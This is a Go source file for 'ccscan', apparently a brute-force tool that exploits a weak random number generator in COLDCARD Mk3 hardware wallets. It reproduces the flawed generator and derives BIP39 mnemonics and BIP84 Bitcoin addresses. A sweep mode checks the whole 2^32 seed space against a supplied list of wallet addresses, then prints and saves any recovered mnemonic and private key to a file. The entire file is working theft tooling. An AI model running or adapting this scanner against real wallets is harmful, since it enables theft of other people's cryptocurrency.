package main

// ccscan - COLDCARD Mk3 weak-RNG seed scanner.
// Bit-exact port of vuln_rng.py (DK27ss) == poc_mk3_rng.py (3z), plus
// BIP39/PBKDF2/BIP32-BIP84/bech32 address matching.
// Modes:
//   demo  : recover systick+skip for a make_victim target.json (validates port)
//   sweep : scan pad (=uid32^systick) 2^32 space x hypotheses vs target list

import (
	"crypto/hmac"
	"crypto/sha256"
	"crypto/sha512"
	_ "embed"
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"math/big"
	"os"
	"runtime"
	"strings"
	"sync/atomic"
	"time"

	secp "github.com/decred/dcrd/dcrec/secp256k1/v4"
	"golang.org/x/crypto/ripemd160"
)

type hitInfo struct {
	Systick  uint32
	Skip     int
	Mnemonic string
	RootPriv string
}

//go:embed bip39_english.txt
var wordlistRaw string
var wordlist []string

func init() {
	wordlist = strings.Fields(wordlistRaw)
	if len(wordlist) != 2048 {
		panic("bad wordlist")
	}
}

// ---------- yasmarang ----------

type yas struct{ pad, n, d, dat uint32 }

func (y *yas) next() uint32 {
	y.pad = y.pad + y.dat + y.d*y.n
	y.pad = (y.pad << 3) + (y.pad >> 29)
	y.n = y.pad | 2
	y.d = y.d ^ ((y.pad << 31) + (y.pad >> 1))
	y.dat = (y.dat ^ (y.pad & 0xFF) ^ (y.d >> 8) ^ 1) & 0xFF
	return y.pad ^ (y.d << 5) ^ (y.pad >> 18) ^ (y.dat << 1)
}

func newMixer() yas { return yas{pad: 0x0A8CE26F, n: 69, d: 233} }

// seedEntropy mirrors vulnerable_seed_entropy(): chip skips, fresh mixer
// (mixerSkip=0 reproduces the Python reference; >0 models boot mixer draws).
// pad = uid32 ^ systick already combined.
func seedEntropy(pad, rtcTR, rtcSSR uint32, chipSkip int, mixXor *[8]uint32) ([32]byte, bool) {
	var out [32]byte
	chip := yas{pad: pad, n: rtcTR, d: rtcSSR}
	for i := 0; i < chipSkip; i++ {
		chip.next()
	}
	var last uint32
	for w := 0; w < 8; w++ {
		c := chip.next()
		if c == last {
			return out, false
		}
		last = c
		c ^= mixXor[w]
		binary.LittleEndian.PutUint32(out[w*4:], c)
	}
	var seen [256]uint8
	distinct := 0
	for _, b := range out {
		if seen[b] == 0 {
			seen[b] = 1
			distinct++
		}
	}
	if distinct <= 4 {
		return out, false
	}
	return sha256.Sum256(out[:]), true
}

func mixerWords(mixerSkip int) [8]uint32 {
	m := newMixer()
	for i := 0; i < mixerSkip; i++ {
		m.next()
	}
	var w [8]uint32
	for i := 0; i < 8; i++ {
		w[i] = m.next()
	}
	return w
}

// ---------- BIP39 ----------

func bitsOf(b []byte, start, n int) int {
	v := 0
	for i := 0; i < n; i++ {
		bit := (b[(start+i)/8] >> (7 - uint((start+i)%8))) & 1
		v = v<<1 | int(bit)
	}
	return v
}

func entropyToMnemonic(ent [32]byte) string {
	cs := sha256.Sum256(ent[:])[0]
	buf := make([]byte, 33)
	copy(buf, ent[:])
	buf[32] = cs
	w := make([]string, 24)
	for i := 0; i < 24; i++ {
		w[i] = wordlist[bitsOf(buf, i*11, 11)]
	}
	return strings.Join(w, " ")
}

// ---------- PBKDF2-HMAC-SHA512 ----------
// pbkdf2_2048 (OpenSSL cgo) lives in pbkdf2.go; this is the pure-Go
// reference kept for the equivalence test.
func pbkdf2_2048_go(password, salt []byte) []byte {
	mac := hmac.New(sha512.New, password)
	mac.Write(salt)
	mac.Write([]byte{0, 0, 0, 1})
	u := mac.Sum(nil)
	t := make([]byte, 64)
	copy(t, u)
	for i := 1; i < 2048; i++ {
		mac.Reset()
		mac.Write(u)
		u = mac.Sum(nil)
		for j := range t {
			t[j] ^= u[j]
		}
	}
	return t
}

// ---------- BIP32 ----------

var curveN, _ = new(big.Int).SetString("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141", 16)

func hmac512(key, data []byte) []byte {
	m := hmac.New(sha512.New, key)
	m.Write(data)
	return m.Sum(nil)
}

func pubCompressed(k []byte) []byte {
	return secp.PrivKeyFromBytes(k).PubKey().SerializeCompressed()
}

func ckdPriv(k, c []byte, index uint32) ([]byte, []byte, bool) {
	var data []byte
	if index >= 0x80000000 {
		data = make([]byte, 1, 37)
		data = append(data, k...)
	} else {
		data = pubCompressed(k)
	}
	var ib [4]byte
	binary.BigEndian.PutUint32(ib[:], index)
	data = append(data, ib[:]...)
	I := hmac512(c, data)
	il := new(big.Int).SetBytes(I[:32])
	if il.Cmp(curveN) >= 0 {
		return nil, nil, false
	}
	ki := il.Add(il, new(big.Int).SetBytes(k))
	ki.Mod(ki, curveN)
	if ki.Sign() == 0 {
		return nil, nil, false
	}
	return ki.FillBytes(make([]byte, 32)), I[32:], true
}

// ---------- bech32 (BIP-173) ----------

const charset = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"

func bech32Polymod(values []int) int {
	gen := [5]int{0x3b6a57b2, 0x26508e6d, 0x1ea119fa, 0x3d4233dd, 0x2a1462b3}
	chk := 1
	for _, v := range values {
		top := chk >> 25
		chk = (chk&0x1FFFFFF)<<5 ^ v
		for i := 0; i < 5; i++ {
			if (top>>i)&1 == 1 {
				chk ^= gen[i]
			}
		}
	}
	return chk
}

func convertbits(data []byte, frombits, tobits uint, pad bool) []int {
	acc, bits := 0, uint(0)
	var ret []int
	maxv := (1 << tobits) - 1
	for _, value := range data {
		acc = (acc << frombits) | int(value)
		bits += frombits
		for bits >= tobits {
			bits -= tobits
			ret = append(ret, (acc>>bits)&maxv)
		}
	}
	if pad && bits > 0 {
		ret = append(ret, (acc<<(tobits-bits))&maxv)
	}
	return ret
}

func p2wpkhAddress(pubkey []byte) string {
	h := sha256.Sum256(pubkey)
	rh := ripemd160.New()
	rh.Write(h[:])
	prog := rh.Sum(nil)
	data := append([]int{0}, convertbits(prog, 8, 5, true)...)
	values := []int{}
	for _, c := range "bc" {
		values = append(values, int(c)>>5)
	}
	values = append(values, 0)
	for _, c := range "bc" {
		values = append(values, int(c)&31)
	}
	values = append(values, data...)
	pm := bech32Polymod(append(values, []int{0, 0, 0, 0, 0, 0}...)) ^ 1
	combined := append([]int{}, data...)
	for i := 0; i < 6; i++ {
		combined = append(combined, (pm>>(5*(5-i)))&31)
	}
	var sb strings.Builder
	sb.WriteString("bc1")
	for _, d := range combined {
		sb.WriteByte(charset[d])
	}
	return sb.String()
}

// ---------- derivation ----------

func bech32DecodeProg(addr string) ([20]byte, bool) {
	var prog [20]byte
	idx := strings.LastIndex(addr, "1")
	if idx < 1 {
		return prog, false
	}
	rev := make(map[byte]int, 32)
	for i := 0; i < 32; i++ {
		rev[charset[i]] = i
	}
	vals := make([]int, 0, len(addr)-idx-1)
	for i := idx + 1; i < len(addr); i++ {
		v, ok := rev[addr[i]]
		if !ok {
			return prog, false
		}
		vals = append(vals, v)
	}
	if len(vals) < 7 || vals[0] != 0 {
		return prog, false
	}
	prog5 := vals[1 : len(vals)-6]
	acc, bits := 0, 0
	var out []byte
	for _, v := range prog5 {
		acc = (acc << 5) | v
		bits += 5
		for bits >= 8 {
			bits -= 8
			out = append(out, byte((acc>>bits)&0xFF))
		}
	}
	if len(out) != 20 {
		return prog, false
	}
	copy(prog[:], out)
	return prog, true
}

// candidateHash160s returns hash160 of the first nIdx external BIP84
// addresses. Parent pubkey is computed once; per index only one EC mul.
func candidateHash160s(seed64 []byte, nIdx int) ([][20]byte, bool) {
	I := hmac512([]byte("Bitcoin seed"), seed64)
	k, c := I[:32], I[32:]
	var ok bool
	for _, idx := range []uint32{84 + 0x80000000, 0x80000000, 0x80000000, 0} {
		k, c, ok = ckdPriv(k, c, idx)
		if !ok {
			return nil, false
		}
	}
	var kS secp.ModNScalar
	kS.SetByteSlice(k)
	serP := secp.PrivKeyFromBytes(k).PubKey().SerializeCompressed()
	out := make([][20]byte, 0, nIdx)
	for i := 0; i < nIdx; i++ {
		var ib [4]byte
		binary.BigEndian.PutUint32(ib[:], uint32(i))
		data := make([]byte, 0, 37)
		data = append(data, serP...)
		data = append(data, ib[:]...)
		Ii := hmac512(c, data)
		var ilS secp.ModNScalar
		if ilS.SetByteSlice(Ii[:32]) {
			continue
		}
		child := ilS.Add(&kS)
		if child.IsZero() {
			continue
		}
		kb := child.Bytes()
		pub := secp.PrivKeyFromBytes(kb[:]).PubKey().SerializeCompressed()
		h := sha256.Sum256(pub)
		rh := ripemd160.New()
		rh.Write(h[:])
		var prog [20]byte
		copy(prog[:], rh.Sum(nil))
		out = append(out, prog)
	}
	return out, true
}

// derive first `nIdx` external BIP84 addresses from seed64.
func candidateAddresses(seed64 []byte, nIdx int) ([]string, []byte) {
	I := hmac512([]byte("Bitcoin seed"), seed64)
	k, c := I[:32], I[32:]
	var ok bool
	for _, idx := range []uint32{84 + 0x80000000, 0x80000000, 0x80000000} {
		k, c, ok = ckdPriv(k, c, idx)
		if !ok {
			return nil, nil
		}
	}
	// change 0
	k0, c0, ok := ckdPriv(k, c, 0)
	if !ok {
		return nil, nil
	}
	addrs := make([]string, 0, nIdx)
	for i := 0; i < nIdx; i++ {
		ki, _, ok := ckdPriv(k0, c0, uint32(i))
		if !ok {
			continue
		}
		addrs = append(addrs, p2wpkhAddress(pubCompressed(ki)))
	}
	return addrs, k
}

func rootPrivHex(seed64 []byte) string {
	I := hmac512([]byte("Bitcoin seed"), seed64)
	k, c := I[:32], I[32:]
	var ok bool
	for _, idx := range []uint32{84 + 0x80000000, 0x80000000, 0x80000000, 0, 0} {
		k, c, ok = ckdPriv(k, c, idx)
		if !ok {
			return ""
		}
	}
	return fmt.Sprintf("%x", k)
}

// ---------- demo mode ----------

type targetJSON struct {
	Address      string `json:"address"`
	UID32        uint32 `json:"uid32"`
	RtcTR        uint32 `json:"rtc_tr"`
	RtcSSR       uint32 `json:"rtc_ssr"`
	SystickRange uint32 `json:"systick_range"`
	SkipRange    int    `json:"skip_range"`
}

func runDemo(path string, workers int) {
	b, err := os.ReadFile(path)
	if err != nil {
		panic(err)
	}
	var t targetJSON
	if err := json.Unmarshal(b, &t); err != nil {
		panic(err)
	}
	total := uint64(t.SystickRange) * uint64(t.SkipRange)
	fmt.Printf("[demo] target %s  space %d states  workers %d\n", t.Address, total, workers)
	mix := mixerWords(0)
	var counter uint64
	var found atomic.Value
	start := time.Now()
	work := func(w int) {
		for systick := uint32(w); systick < t.SystickRange; systick += uint32(workers) {
			for skip := 0; skip < t.SkipRange; skip++ {
				ent, ok := seedEntropy(t.UID32^systick, t.RtcTR, t.RtcSSR, skip, &mix)
				if !ok {
					continue
				}
				mn := entropyToMnemonic(ent)
				seed64 := pbkdf2_2048([]byte(mn), []byte("mnemonic"))
				addrs, _ := candidateAddresses(seed64, 1)
				if len(addrs) == 1 && addrs[0] == t.Address {
					found.Store(hitInfo{systick, skip, mn, rootPrivHex(seed64)})
					return
				}
			}
			if systick&0x3FF == 0 {
				atomic.AddUint64(&counter, 1024*uint64(t.SkipRange))
			}
			if found.Load() != nil {
				return
			}
		}
	}
	done := make(chan struct{})
	for w := 0; w < workers; w++ {
		go func(w int) { work(w); done <- struct{}{} }(w)
	}
	ticker := time.NewTicker(5 * time.Second)
	finished := 0
	for finished < workers {
		select {
		case <-done:
			finished++
		case <-ticker.C:
			n := atomic.LoadUint64(&counter)
			fmt.Printf("\r[demo] ~%d/%d (%.0f/s)", n, total, float64(n)/time.Since(start).Seconds())
		}
		if h := found.Load(); h != nil {
			break
		}
	}
	ticker.Stop()
	dt := time.Since(start)
	if h := found.Load(); h != nil {
		hh := h.(hitInfo)
		fmt.Printf("\n[demo] STATE FOUND in %.1fs: systick=%d skip=%d\n", dt.Seconds(), hh.Systick, hh.Skip)
		fmt.Printf("[demo] mnemonic: %s\n", hh.Mnemonic)
		fmt.Printf("[demo] root privkey m/84'/0'/0'/0/0: %s\n", hh.RootPriv)
		return
	}
	fmt.Printf("\n[demo] not found (%.1fs)\n", dt.Seconds())
	os.Exit(1)
}

// ---------- sweep mode ----------

type sweepCfg struct {
	targets    map[[20]byte]string
	rtcTR      uint32
	rtcSSR     uint32
	skipLo     int
	skipHi     int
	mixerSkip  int
	nIdx       int
	workers    int
	padStart   uint64
	checkpoint string
}

type ckpt struct {
	RtcTR     uint32 `json:"rtc_tr"`
	RtcSSR    uint32 `json:"rtc_ssr"`
	ChipSkip  int    `json:"chip_skip"`
	MixerSkip int    `json:"mixer_skip"`
	NextPad   uint64 `json:"next_pad"`
}

type sweepHit struct {
	Pad       uint32 `json:"pad"`
	RtcTR     uint32 `json:"rtc_tr"`
	RtcSSR    uint32 `json:"rtc_ssr"`
	ChipSkip  int    `json:"chip_skip"`
	AddrIdx   int    `json:"addr_index"`
	Address   string `json:"address"`
	Mnemonic  string `json:"mnemonic"`
	RootPriv  string `json:"root_priv"`
}

func loadTargets(path string) map[[20]byte]string {
	b, err := os.ReadFile(path)
	if err != nil {
		panic(err)
	}
	m := map[[20]byte]string{}
	for _, line := range strings.Split(string(b), "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		prog, ok := bech32DecodeProg(line)
		if !ok {
			panic("bad target address: " + line)
		}
		m[prog] = line
	}
	return m
}

func runSweep(cfg sweepCfg) {
	fmt.Printf("[sweep] %d targets, rtc_tr=%d rtc_ssr=%d chip-skip [%d,%d) mixer-skip %d nidx %d workers %d pad-start %d\n",
		len(cfg.targets), cfg.rtcTR, cfg.rtcSSR, cfg.skipLo, cfg.skipHi, cfg.mixerSkip, cfg.nIdx, cfg.workers, cfg.padStart)
	const padSpace = uint64(1) << 32
	const chunk = uint64(1) << 16
	for skip := cfg.skipLo; skip < cfg.skipHi; skip++ {
		mix := mixerWords(cfg.mixerSkip)
		var counter uint64
		var next atomic.Uint64
		next.Store(cfg.padStart / chunk)
		var found atomic.Value
		start := time.Now()
		done := make(chan struct{})
		worker := func() {
			for found.Load() == nil {
				c := next.Add(1) - 1
				base := c * chunk
				if base >= padSpace {
					break
				}
				end := base + chunk
				if end > padSpace {
					end = padSpace
				}
				for pad := base; pad < end; pad++ {
					ent, ok := seedEntropy(uint32(pad), cfg.rtcTR, cfg.rtcSSR, skip, &mix)
					if !ok {
						continue
					}
					mn := entropyToMnemonic(ent)
					seed64 := pbkdf2_2048([]byte(mn), []byte("mnemonic"))
					h160s, _ := candidateHash160s(seed64, cfg.nIdx)
					for i, h := range h160s {
						if addr, ok := cfg.targets[h]; ok {
							found.Store(sweepHit{uint32(pad), cfg.rtcTR, cfg.rtcSSR, skip, i, addr, mn, rootPrivHex(seed64)})
							break
						}
					}
					if found.Load() != nil {
						break
					}
				}
				atomic.AddUint64(&counter, end-base)
			}
			done <- struct{}{}
		}
		for w := 0; w < cfg.workers; w++ {
			go worker()
		}
		ticker := time.NewTicker(10 * time.Second)
		ckTicker := time.NewTicker(60 * time.Second)
		finished := 0
	loop:
		for finished < cfg.workers {
			select {
			case <-done:
				finished++
			case <-ticker.C:
				n := atomic.LoadUint64(&counter)
				rate := float64(n) / time.Since(start).Seconds()
				eta := time.Duration(float64(padSpace-cfg.padStart)/rate) * time.Second
				fmt.Printf("[sweep] skip=%d pad~%d/2^32 %.0f/s eta %s\n", skip, cfg.padStart+n, rate, eta.Truncate(time.Minute))
			case <-ckTicker.C:
				if cfg.checkpoint != "" {
					c := ckpt{cfg.rtcTR, cfg.rtcSSR, skip, cfg.mixerSkip, cfg.padStart + atomic.LoadUint64(&counter)}
						b, _ := json.MarshalIndent(c, "", "  ")
					os.WriteFile(cfg.checkpoint, b, 0644)
				}
			}
			if found.Load() != nil {
				break loop
			}
		}
		ticker.Stop()
		ckTicker.Stop()
		if h := found.Load(); h != nil {
			b, _ := json.MarshalIndent(h.(sweepHit), "", "  ")
			fmt.Printf("[sweep] HIT:\n%s\n", b)
			os.WriteFile("hit.json", b, 0644)
			os.Exit(0)
		}
		fmt.Printf("[sweep] skip=%d done in %s, no hit\n", skip, time.Since(start).Truncate(time.Second))
		cfg.padStart = 0
	}
	fmt.Println("[sweep] all hypotheses exhausted, no hit")
}

func main() {
	mode := flag.String("mode", "demo", "demo|sweep")
	target := flag.String("target", "", "target.json (demo)")
	targetsFile := flag.String("targets", "", "address list file (sweep)")
	rtcTR := flag.Uint("rtc-tr", 0, "RTC TR hypothesis")
	rtcSSR := flag.Uint("rtc-ssr", 0, "RTC SSR hypothesis")
	skipLo := flag.Int("skip-lo", 0, "chip skip range lo")
	skipHi := flag.Int("skip-hi", 1, "chip skip range hi (exclusive)")
	mixerSkip := flag.Int("mixer-skip", 0, "mixer skip")
	nIdx := flag.Int("nidx", 8, "address indices to derive per candidate")
	padStart := flag.Uint64("pad-start", 0, "pad start offset (resume)")
	checkpoint := flag.String("checkpoint", "", "checkpoint file")
	workers := flag.Int("workers", runtime.NumCPU(), "worker goroutines")
	flag.Parse()
	switch *mode {
	case "demo":
		runDemo(*target, *workers)
	case "sweep":
		runSweep(sweepCfg{
			targets:    loadTargets(*targetsFile),
			rtcTR:      uint32(*rtcTR),
			rtcSSR:     uint32(*rtcSSR),
			skipLo:     *skipLo,
			skipHi:     *skipHi,
			mixerSkip:  *mixerSkip,
			nIdx:       *nIdx,
			workers:    *workers,
			padStart:   *padStart,
			checkpoint: *checkpoint,
		})
	}
}
